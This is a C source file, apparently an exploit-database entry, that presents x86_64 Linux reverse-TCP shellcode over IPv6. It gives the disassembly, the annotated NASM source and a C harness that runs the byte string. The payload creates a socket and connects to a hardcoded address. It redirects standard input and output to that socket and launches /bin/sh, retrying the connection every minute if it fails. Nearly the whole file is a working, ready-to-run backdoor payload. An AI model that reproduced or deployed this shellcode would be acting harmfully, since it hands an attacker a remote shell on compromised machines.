/*
 # Title : Linux x86_64 reverse tcp (ipv6)
 # Date : 04-05-2016
 # Author : Roziul Hasan Khan Shifat
 # Tested on : Ubuntu 14.04 LTS x86_64

*/

/*

Disassembly of section .text:

0000000000400080 <_start>:
  400080:	48 31 c0             	xor    rax,rax
  400083:	6a 06                	push   0x6
  400085:	6a 01                	push   0x1
  400087:	6a 0a                	push   0xa
  400089:	5f                   	pop    rdi
  40008a:	5e                   	pop    rsi
  40008b:	5a                   	pop    rdx
  40008c:	b0 29                	mov    al,0x29
  40008e:	0f 05                	syscall
  400090:	48 31 db             	xor    rbx,rbx
  400093:	48 89 c3             	mov    rbx,rax
  400096:	48 31 ff             	xor    rdi,rdi
  400099:	48 31 c0             	xor    rax,rax
  40009c:	b0 39                	mov    al,0x39
  40009e:	0f 05                	syscall
  4000a0:	48 31 ff             	xor    rdi,rdi
  4000a3:	48 39 f8             	cmp    rax,rdi
  4000a6:	74 07                	je     4000af <connect>
  4000a8:	48 31 c0             	xor    rax,rax
  4000ab:	b0 3c                	mov    al,0x3c
  4000ad:	0f 05                	syscall

00000000004000af <connect>:
  4000af:	48 31 d2             	xor    rdx,rdx
  4000b2:	48 31 f6             	xor    rsi,rsi
  4000b5:	48 f7 e6             	mul    rsi
  4000b8:	56                   	push   rsi
  4000b9:	56                   	push   rsi
  4000ba:	56                   	push   rsi
  4000bb:	56                   	push   rsi
  4000bc:	56                   	push   rsi
  4000bd:	c6 04 24 0a          	mov    BYTE PTR [rsp],0xa
  4000c1:	66 c7 44 24 02 05 c0 	mov    WORD PTR [rsp+0x2],0xc005
  4000c8:	66 c7 44 24 12 ff ff 	mov    WORD PTR [rsp+0x12],0xffff
  4000cf:	c7 44 24 14 c0 a8 d1 	mov    DWORD PTR [rsp+0x14],0x83d1a8c0
  4000d6:	83
  4000d7:	48 89 e6             	mov    rsi,rsp
  4000da:	b2 1c                	mov    dl,0x1c
  4000dc:	48 89 df             	mov    rdi,rbx
  4000df:	b0 2a                	mov    al,0x2a
  4000e1:	0f 05                	syscall
  4000e3:	48 31 f6             	xor    rsi,rsi
  4000e6:	48 39 f0             	cmp    rax,rsi
  4000e9:	75 4b                	jne    400136 <try_again>
  4000eb:	48 31 f6             	xor    rsi,rsi
  4000ee:	48 f7 e6             	mul    rsi
  4000f1:	48 89 df             	mov    rdi,rbx
  4000f4:	b0 21                	mov    al,0x21
  4000f6:	0f 05                	syscall
  4000f8:	48 31 c0             	xor    rax,rax
  4000fb:	48 ff c6             	inc    rsi
  4000fe:	48 89 df             	mov    rdi,rbx
  400101:	b0 21                	mov    al,0x21
  400103:	0f 05                	syscall
  400105:	48 31 c0             	xor    rax,rax
  400108:	48 ff c6             	inc    rsi
  40010b:	48 89 df             	mov    rdi,rbx
  40010e:	b0 21                	mov    al,0x21
  400110:	0f 05                	syscall
  400112:	48 31 f6             	xor    rsi,rsi
  400115:	48 31 d2             	xor    rdx,rdx
  400118:	48 f7 e2             	mul    rdx
  40011b:	49 b8 2f 2f 2f 2f 2f 	movabs r8,0x6e69622f2f2f2f2f
  400122:	62 69 6e
  400125:	41 ba 2f 2f 73 68    	mov    r10d,0x68732f2f
  40012b:	41 52                	push   r10
  40012d:	41 50                	push   r8
  40012f:	48 89 e7             	mov    rdi,rsp
  400132:	b0 3b                	mov    al,0x3b
  400134:	0f 05                	syscall

0000000000400136 <try_again>:
  400136:	48 31 f6             	xor    rsi,rsi
  400139:	48 f7 e6             	mul    rsi
  40013c:	56                   	push   rsi
  40013d:	6a 3c                	push   0x3c
  40013f:	48 89 e7             	mov    rdi,rsp
  400142:	b0 23                	mov    al,0x23
  400144:	0f 05                	syscall
  400146:	e9 64 ff ff ff       	jmp    4000af <connect>

*/


/*

section .text
	global _start
_start:

;;socket()
xor rax,rax

push 6
push 0x1
push 10

pop rdi
pop rsi
pop rdx


mov al,41 ;socket()

syscall
xor rbx,rbx

mov rbx,rax ;storing socket descriptor

xor rdi,rdi
xor rax,rax

mov al,57
syscall

xor rdi,rdi
cmp rax,rdi

je connect

xor rax,rax
mov al,60
syscall


;-----------------------------------------------------
;connect()

connect:
xor rdx,rdx
xor rsi,rsi

mul rsi


;----------------------------
;struct sockaddr_in6

push rsi
push rsi
push rsi
push rsi
push rsi

mov byte [rsp],10
mov word [rsp+2],0xc005
mov word [rsp+18],0xffff
mov dword [rsp+20],0x83d1a8c0 ;just change it. current ipv4 address inet_addr("192.168.209.131")

;-----------------------------

mov rsi,rsp

mov dl,28

mov rdi,rbx

mov al,42
syscall

xor rsi,rsi

cmp rax,rsi
jne try_again ;it will reconnect after 1 min , if it is failed to connect


;------------------------

;------------------

;;dup2(sd,0)
xor rsi,rsi
mul rsi

mov rdi,rbx
mov al,33
syscall

;------------

;------------------

;;dup2(sd,1)
xor rax,rax
inc rsi

mov rdi,rbx
mov al,33
syscall

;------------

;------------------

;;dup2(sd,2)
xor rax,rax
inc rsi

mov rdi,rbx
mov al,33
syscall


;-----------------------


;;execve("/////bin//sh",NULL,NULL)

xor rsi,rsi
xor rdx,rdx
mul rdx

mov qword r8,'/////bin'
mov r10, '//sh'

push r10
push r8

mov rdi,rsp

mov al,59
syscall


;-----------------------------


try_again:
xor rsi,rsi
mul rsi

push rsi
push byte 60 ;1 min

mov rdi,rsp

mov al,35
syscall

jmp connect
;-----------------------------------

*/


#include<stdio.h>
#include<string.h>
char shellcode[] ="\x48\x31\xc0\x6a\x06\x6a\x01\x6a\x0a\x5f\x5e\x5a\xb0\x29\x0f\x05\x48\x31\xdb\x48\x89\xc3\x48\x31\xff\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xff\x48\x39\xf8\x74\x07\x48\x31\xc0\xb0\x3c\x0f\x05\x48\x31\xd2\x48\x31\xf6\x48\xf7\xe6\x56\x56\x56\x56\x56\xc6\x04\x24\x0a\x66\xc7\x44\x24\x02\x05\xc0\x66\xc7\x44\x24\x12\xff\xff\xc7\x44\x24\x14\xc0\xa8\xd1\x83\x48\x89\xe6\xb2\x1c\x48\x89\xdf\xb0\x2a\x0f\x05\x48\x31\xf6\x48\x39\xf0\x75\x4b\x48\x31\xf6\x48\xf7\xe6\x48\x89\xdf\xb0\x21\x0f\x05\x48\x31\xc0\x48\xff\xc6\x48\x89\xdf\xb0\x21\x0f\x05\x48\x31\xc0\x48\xff\xc6\x48\x89\xdf\xb0\x21\x0f\x05\x48\x31\xf6\x48\x31\xd2\x48\xf7\xe2\x49\xb8\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x41\xba\x2f\x2f\x73\x68\x41\x52\x41\x50\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x56\x6a\x3c\x48\x89\xe7\xb0\x23\x0f\x05\xe9\x64\xff\xff\xff";

main()
{

printf("shellcode length %ld\n",(unsigned long)strlen(shellcode));

(* (int(*)()) shellcode) ();


return 0;
}